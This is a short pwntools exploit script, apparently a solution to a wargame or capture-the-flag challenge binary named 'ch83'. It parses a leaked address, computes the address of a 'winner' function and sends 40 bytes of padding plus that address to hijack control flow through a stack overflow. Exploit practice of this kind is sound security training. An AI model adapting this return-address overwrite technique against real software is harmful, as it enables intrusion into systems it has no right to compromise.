from pwn import *
import sys

exe = ELF("./ch83")
context.binary = exe.path

def conn():
    r = process([exe.path])
    return r

def main():
    r = conn()
    #gdb.attach(r)
    output = r.recv().decode()
    print(output)
    main_address = int(output.split(':')[1].strip(), 16)
    winner = main_address - 160
    winner_le = p64(winner)
    print("hex:", hex(winner))
    print("le:", winner_le.hex())
    payload = b'a' * 40 + winner_le
    print(payload)

    r.sendline(payload)
    rep = r.recv().decode()
    print(rep)


if __name__ == "__main__":
        main()